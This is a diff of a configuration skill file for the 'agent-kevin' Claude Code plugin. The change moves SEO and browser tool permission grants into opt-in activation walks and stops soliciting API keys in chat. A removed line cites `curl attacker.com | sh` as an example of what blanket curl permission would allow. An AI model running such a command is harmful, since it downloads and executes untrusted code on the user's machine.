@@ -73,36 +73,49 @@ If nothing is ticked, cancel and return to Step 1. Otherwise run the matching su
 
 | Skill | Backed by | Required key(s) | Extra permission to grant |
 |---|---|---|---|
-| `serpapi` | `mcp__plugin_agent-kevin_kevin__serpapi_search` | `SERPAPI_KEY` (https://serpapi.com) | _already granted by `/init`_ |
-| `open-page-rank` | `mcp__plugin_agent-kevin_kevin__open_page_rank` | `OPENPAGERANK_API_KEY` (https://openpagerank.com) | _already granted by `/init`_ |
-| `google-search-console` | `mcp__plugin_agent-kevin_kevin__gsc_*` | Google OAuth + `GSC_SITE_URL` | _already granted by `/init`_ |
-| `google-page-speed` | `mcp__plugin_agent-kevin_kevin__page_speed_*` | Google OAuth (shared with GSC) | _already granted by `/init`_ |
+| `serpapi` | `mcp__plugin_agent-kevin_kevin__serpapi_search` | `SERPAPI_KEY` (https://serpapi.com) | _granted by this SEO walk_ |
+| `open-page-rank` | `mcp__plugin_agent-kevin_kevin__open_page_rank` | `OPENPAGERANK_API_KEY` (https://openpagerank.com) | _granted by this SEO walk_ |
+| `google-search-console` | `mcp__plugin_agent-kevin_kevin__gsc_*` | Google OAuth + `GSC_SITE_URL` | _granted by this SEO walk_ |
+| `google-page-speed` | `mcp__plugin_agent-kevin_kevin__page_speed_*` | Google OAuth (shared with GSC) | _granted by this SEO walk_ |
 | `wordpress-rest` | direct `curl` | none | `Bash(curl https://<host>/*)` + `Bash(curl * https://<host>/*)`, where `<host>` is derived from `GSC_SITE_URL`. Only granted if `google-search-console` was configured this run (so `GSC_SITE_URL` is set). Otherwise curl confirms per-call. |
-| `google-search-audit` | composite (uses tools above) | shares the keys above | _already granted by `/init`_ |
+| `google-search-audit` | composite (uses tools above) | shares the keys above | _granted by this SEO walk_ |
 
-**Plugin-bundled MCP tools are pre-granted by `/agent-kevin:init`** — that flow writes all `mcp__plugin_agent-kevin_kevin__*` entries into `$PROJECT_SETTINGS` → `permissions.allow` at scaffold time. This skill only handles non-plugin configuration: API keys consumed by `kevin` tools (`SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL`, `PERPLEXITY_API_KEY`), Google OAuth flow for GSC/PSI, and **host-scoped** curl grants for `wordpress-rest` (derived from `GSC_SITE_URL` so they're locked to the user's actual site, not blanket `Bash(curl *)` which would authorise arbitrary network requests like `curl attacker.com | sh`).
+**`/agent-kevin:init` only pre-grants the always-on core MCP tools** — `ping`, `compile_*`, `task_*`, `links_rewrite`, `memory_prune`. The SEO-gated tools (`serpapi_search`, `open_page_rank`, `gsc_*`, `page_speed_*`, `google_auth`) land in `permissions.allow` only when this SEO walk runs, and only if the user activates the pack (no per-call confirm prompts after that).
 
-Walk the 4 skills that *need keys* one at a time (`serpapi`, `open-page-rank`, `google-search-console`, `google-page-speed`). For each, `AskUserQuestion`:
+The walk handles three concrete tasks per skill:
+1. Add SEO-gated MCP tool grants to `$PROJECT_SETTINGS` → `permissions.allow` (§E).
+2. Ensure empty env placeholders exist in `$SETTINGS_FILE` for `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL` (§D — write `""` if absent; do **not** overwrite non-empty existing values).
+3. Surface the Google OAuth file-drop flow (no value passes through chat).
+4. If `GSC_SITE_URL` is set, add host-scoped curl grants for `wordpress-rest` (locked to the user's actual site, not blanket `Bash(curl *)`).
 
-> **Configure `<skill-name>`?**
+> **Never prompt for API key values in chat.** Even with the session-capture redaction hook, pasted keys touch the transcript and the Anthropic API. The walk surfaces *which keys are needed* and *where to fill them* (`<HOME>/.claude/settings.local.json` → `env` block); the user fills the value via editor. The session-capture redactor (exact-match against `settings.local.json` env values + known prefixes `pplx-…`, `sk-…`, `AIza…`) is a defense-in-depth net, not a license to ask.
+
+Walk the 4 skills that *need keys* one at a time. For each, `AskUserQuestion`:
+
+> **Activate `<skill-name>`?**
 > Description: `<one-line summary from the SKILL.md frontmatter>`
-> Requires: `<key name(s)>`
+> Requires: `<key name(s)>` — value goes in `.claude/settings.local.json` env block (you fill after init via editor)
 >
-> - Yes, set up the key now
-> - Skip (key absent — the skill stays callable but tool calls will error until configured)
+> - Yes — grant tool permissions + ensure env placeholder exists
+> - Skip (no permission grant, no placeholder)
 
 If yes:
-- For env-var keys (`SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL`): ask for the value, write to `$SETTINGS_FILE` env block (§D).
+- For env-var keys (`SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL`): ensure key exists in `$SETTINGS_FILE` env block with empty-string value if missing (§D). Never overwrite a non-empty value. **Don't ask the user to paste the value.**
 - For Google OAuth: walk the user through obtaining a client JSON, then placing it. Surface these steps verbatim:
   1. Open [Google Cloud Console → APIs & Services → Credentials](https://console.cloud.google.com/apis/credentials).
   2. Pick (or create) a project. Under **Library**, enable the **Search Console API** and **PageSpeed Insights API**.
   3. **Credentials** → **Create Credentials** → **OAuth client ID** → application type **Desktop app** → Create → download the JSON.
   4. Move the file to `$HOME_DIR/.kevin/config/google-oauth-client.json` (`mkdir -p` the dir if missing).
-  5. Inside Claude Code, run `mcp__plugin_agent-kevin_kevin__google_auth`. A browser tab opens, the user grants access, the refresh token is minted and persisted alongside the client JSON.
+  5. Set `GSC_SITE_URL` in `$SETTINGS_FILE` env block via editor.
+  6. Inside Claude Code (after relaunch), run `mcp__plugin_agent-kevin_kevin__google_auth`. A browser tab opens, the user grants access, the refresh token is minted and persisted alongside the client JSON.
 
   After that, all `gsc_*` and `page_speed_*` tools work without re-prompting.
 
-> **Note on key values in chat:** when the user pastes a key into the chat, the value enters the session transcript. The session-capture hook redacts known-key values (anything in `$SETTINGS_FILE` `env`) and common key prefixes (`sk-…`, `pplx-…`, `AIza…`, `sk-ant-…`, `gh[pous]_…`) before writing the transcript to `knowledge/raw/sessions/`. So keys are scrubbed from the persisted log even if pasted in chat. The redaction is exact-match against the values stored in `settings.local.json`, so once a key is saved, all future captures will redact it deterministically.
+- Grant the matching MCP tool entries to `permissions.allow` via §E. Granular mapping:
+  - `serpapi` → `mcp__plugin_agent-kevin_kevin__serpapi_search`
+  - `open-page-rank` → `mcp__plugin_agent-kevin_kevin__open_page_rank`
+  - `google-search-console` → `mcp__plugin_agent-kevin_kevin__gsc_inspect`, `gsc_query`, `gsc_sites`, `google_auth`
+  - `google-page-speed` → `mcp__plugin_agent-kevin_kevin__page_speed_audit`, `page_speed_psi`, `google_auth` (deduped if GSC also chosen)
 
 **For `wordpress-rest`:** if `GSC_SITE_URL` was set this run (the user configured `google-search-console`), derive the bare host and grant two scoped curl patterns via §E. This lets `wordpress-rest` call the user's own WP REST endpoints without re-prompting, without authorising curl to arbitrary hosts. Pure-prompt third-party SEO/content skills (e.g., `content-quality-auditor`, `seo-content-writer`) are NOT bundled with this plugin — install them via Section F if you want them.
 
@@ -125,33 +138,53 @@ If `GSC_SITE_URL` is NOT set (user skipped GSC config), skip the curl grant — 
 After all keyed skills processed, print a summary:
 
 ```
-✅ SEO pack configured.
+✅ SEO pack activated.
 
-Keys provided:    <list of the 3 env keys actually set>
-Keys still missing: <list — re-run /agent-kevin:configure-skills when you get them>
-Google OAuth:     <ready | needs `mcp__plugin_agent-kevin_kevin__google_auth` after dropping the client JSON>
-Permissions granted: <count> entries in .claude/settings.json
+Tool permissions granted:  <list of MCP tools added to settings.json>
+Env placeholders ready:    <list of empty keys in settings.local.json — fill these via editor>
+                           SERPAPI_KEY, OPENPAGERANK_API_KEY, GSC_SITE_URL
+Google OAuth:              <pending: drop client JSON to .kevin/config/google-oauth-client.json, then run `mcp__plugin_agent-kevin_kevin__google_auth` after relaunch>
+
+Fill the values in <HOME>/.claude/settings.local.json — never paste them into chat.
 ```
 
 ### A.2b — Browser pack walk
 
-The Browser pack is one piece of configuration: the **Perplexity API key**. `perplexity_search` is a native `kevin` MCP tool that calls the Perplexity Search API directly — it loads on every session but stays inert until `PERPLEXITY_API_KEY` lands in the env block of `$SETTINGS_FILE`. Tool permission was pre-granted by `/init`. (Playwright tools are part of the same MCP and already grant-able via permissions.)
+The Browser pack has two pieces, each independently activatable:
+1. **Perplexity** — grant `perplexity_search` permission + ensure `PERPLEXITY_API_KEY` placeholder.
+2. **Playwright** — grant `playwright_{screenshot,pdf,record}` permissions (no key; Chromium runs locally).
+
+Neither is pre-granted by `/init` anymore — they only land when the user activates the matching piece.
 
 **(1) Perplexity** — `mcp__plugin_agent-kevin_kevin__perplexity_search`.
 
 `AskUserQuestion`:
 
-> **Set Perplexity API key?**
-> Sign up at https://perplexity.ai/settings/api for an API key. The `perplexity_search` tool is already wired into the `kevin` MCP and granted permissions by `/init` — this step just provides the key so calls actually succeed.
+> **Activate Perplexity search?**
+> Adds `mcp__plugin_agent-kevin_kevin__perplexity_search` to `permissions.allow` and ensures `PERPLEXITY_API_KEY` slot exists in `.claude/settings.local.json` env block. You fill the key value via your editor after this completes (sign up at https://perplexity.ai/settings/api). The tool stays callable but returns "missing env var" until you fill it.
 >
-> - Yes, provide the key now
-> - Skip (server stays inert until you set `PERPLEXITY_API_KEY` later)
+> - Yes — grant permission + ensure placeholder
+> - Skip (no permission grant, no placeholder)
 
-If installing: write `PERPLEXITY_API_KEY=<value>` into `$SETTINGS_FILE` env block (§D). **Do not** touch `$MCP_FILE` — `perplexity_search` lives inside the `kevin` MCP server, not a separate project-registered server.
+If yes:
+- Add `mcp__plugin_agent-kevin_kevin__perplexity_search` to `permissions.allow` via §E.
+- Ensure `PERPLEXITY_API_KEY: ""` exists in `$SETTINGS_FILE` env block via §D (only writes empty string if key is absent — never overwrites a non-empty existing value).
+- **Do not** ask the user to paste the key value.
+- **Do not** touch `$MCP_FILE` — `perplexity_search` lives inside the `kevin` MCP server, not a separate project-registered server.
 
 **(2) Playwright** — `mcp__plugin_agent-kevin_kevin__playwright_{screenshot,pdf,record}` tools.
 
-Nothing to configure — these are part of the plugin's own MCP and permissions for them were granted by `/init`. Just verify the chromium binary is in place (the plugin's postinstall handles this):
+`AskUserQuestion`:
+
+> **Activate Playwright (screenshot / PDF / record)?**
+> Adds the three playwright tool permissions to `permissions.allow`. No API key needed — Chromium runs locally from the plugin's bundled install.
+>
+> - Yes — grant permissions
+> - Skip
+
+If yes: add `playwright_screenshot`, `playwright_pdf`, `playwright_record` to `permissions.allow` via §E.
+
+Then verify the chromium binary is in place (the plugin's postinstall handles this):
 
 ```bash
 bunx playwright --version 2>&1 || echo "PLAYWRIGHT_MISSING"
@@ -261,15 +294,16 @@ Print per library: install status + symlink path + upstream LICENSE first-line. 
 ### C.2 Deconfigure actions
 
 **SEO deconfigure:**
-- Revoke any `Bash(curl https://<host>/*)` or `Bash(curl * https://<host>/*)` entries from `$PROJECT_SETTINGS` → `permissions.allow` (§E remove helper) — those were the host-scoped curl grants written when SEO was configured. To know which host, read `GSC_SITE_URL` from `$SETTINGS_FILE` before deleting it (next step) and normalise the same way the configure flow did. If `GSC_SITE_URL` is already gone, fall back to scanning `permissions.allow` for any entry matching `Bash(curl *)` and ask the user before removing.
-- Do **not** revoke the `mcp__plugin_agent-kevin_kevin__*` entries — those are the plugin baseline from `/init`.
+- Revoke SEO-gated MCP tool grants from `$PROJECT_SETTINGS` → `permissions.allow` (§E remove helper): `serpapi_search`, `open_page_rank`, `gsc_inspect`, `gsc_query`, `gsc_sites`, `page_speed_audit`, `page_speed_psi`, `google_auth`. These were added by the SEO activation walk; the always-on core (`ping`, `compile_*`, `task_*`, `links_rewrite`, `memory_prune`) stays.
+- Revoke any `Bash(curl https://<host>/*)` or `Bash(curl * https://<host>/*)` entries — those were the host-scoped curl grants written when SEO was activated. To know which host, read `GSC_SITE_URL` from `$SETTINGS_FILE` before deciding (next step) and normalise the same way the configure flow did. If `GSC_SITE_URL` is already empty, fall back to scanning `permissions.allow` for any `Bash(curl *)` entry and ask the user before removing.
 - `AskUserQuestion`: "Also remove `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL` from `$SETTINGS_FILE`?" (Yes/No)
 - If yes: read `$SETTINGS_FILE`, delete those keys from `env`, write back.
 
 **Browser deconfigure:**
+- Revoke Browser-gated MCP tool grants from `permissions.allow` (§E remove helper): `perplexity_search`, `playwright_screenshot`, `playwright_pdf`, `playwright_record`. Always-on core stays.
 - `AskUserQuestion`: "Remove `PERPLEXITY_API_KEY` from `$SETTINGS_FILE`?" (Yes/No). If yes, delete via §D.
-- Do **not** touch `$MCP_FILE` and do **not** revoke `mcp__plugin_agent-kevin_kevin__perplexity_search` — both are plugin baseline (tool lives in the `kevin` MCP server, permission written by `/init`). The tool stays loaded but inert without the key, which is what "deconfigured" means here.
-- Remind user: playwright + chromium stay installed (part of plugin base deps).
+- Do **not** touch `$MCP_FILE` — `perplexity_search` lives inside the `kevin` MCP server, not a project-registered server.
+- Remind user: playwright + chromium stay installed (part of plugin base deps); only the permission grants get removed.
 
 Print summary of what was removed.
 
@@ -277,14 +311,24 @@ Print summary of what was removed.
 
 ## Section D — Helper: write keys to `settings.local.json`
 
-To write `KEY=value` to `$SETTINGS_FILE`'s env block:
+Two variants — **ensure placeholder** (used by pack activation walks) vs. **set value** (only used when migrating an existing config; **never** in response to a chat paste).
 
-1. Read existing file. If it doesn't exist, start with `{}`.
-2. Ensure `.env` is an object — initialize if missing.
-3. Set `env[KEY] = value`.
+**Ensure placeholder** (`KEY` exists with empty-string value if missing):
+
+1. Read `$SETTINGS_FILE`. If it doesn't exist, start with `{}`.
+2. Ensure `env` is an object — initialize if missing.
+3. If `env[KEY]` is **undefined**, set `env[KEY] = ""`. If it exists with **any** value (even empty), do nothing.
 4. Write back with 2-space indent.
 
-Example final shape:
+This is what every pack activation walk uses — it never overwrites a value the user already filled, and never solicits a value via chat.
+
+**Set value** (used only for non-secret migrations, sanitized inputs):
+
+1–2. Same as above.
+3. Set `env[KEY] = value`. Use only when the value did not pass through the chat transcript.
+4. Write back.
+
+Example final shape — what the user fills via their editor after pack activation:
 
 ```json
 {
@@ -315,7 +359,7 @@ When a pack/skill is configured, write its tools into `$PROJECT_SETTINGS` → `p
 4. Sort `permissions.allow` alphabetically (deterministic diffs).
 5. Write back with 2-space indent.
 
-Example final shape (`/init` baseline + SEO with `GSC_SITE_URL=https://example.com/`). The `mcp__plugin_agent-kevin_kevin__*` entries (including `perplexity_search`, which lives in the `kevin` MCP server) and the read-mostly Bash patterns are written by `/init`; this skill appends host-scoped curl (when SEO is configured). Browser configuration only touches `$SETTINGS_FILE` env (the API key) — no permissions diff here:
+Example final shape — `/init` always-on baseline + **both** SEO and Browser activated, with SEO setting `GSC_SITE_URL=https://example.com/`. The core Bash patterns + core `kevin` MCP entries (`ping`, `compile_*`, `task_*`, `links_rewrite`, `memory_prune`) are written by `/init`; this skill appends pack-gated MCP entries when each pack is activated + host-scoped curl when SEO's `GSC_SITE_URL` is set:
 
 ```json
 {
@@ -354,6 +398,7 @@ Example final shape (`/init` baseline + SEO with `GSC_SITE_URL=https://example.c
       "mcp__plugin_agent-kevin_kevin__open_page_rank",
       "mcp__plugin_agent-kevin_kevin__page_speed_audit",
       "mcp__plugin_agent-kevin_kevin__page_speed_psi",
+      "mcp__plugin_agent-kevin_kevin__perplexity_search",
       "mcp__plugin_agent-kevin_kevin__ping",
       "mcp__plugin_agent-kevin_kevin__playwright_pdf",
       "mcp__plugin_agent-kevin_kevin__playwright_record",
@@ -365,8 +410,7 @@ Example final shape (`/init` baseline + SEO with `GSC_SITE_URL=https://example.c
       "mcp__plugin_agent-kevin_kevin__task_query",
       "mcp__plugin_agent-kevin_kevin__task_scan",
       "mcp__plugin_agent-kevin_kevin__task_thread",
-      "mcp__plugin_agent-kevin_kevin__task_update",
-      "mcp__plugin_agent-kevin_kevin__perplexity_search"
+      "mcp__plugin_agent-kevin_kevin__task_update"
     ]
   }
 }
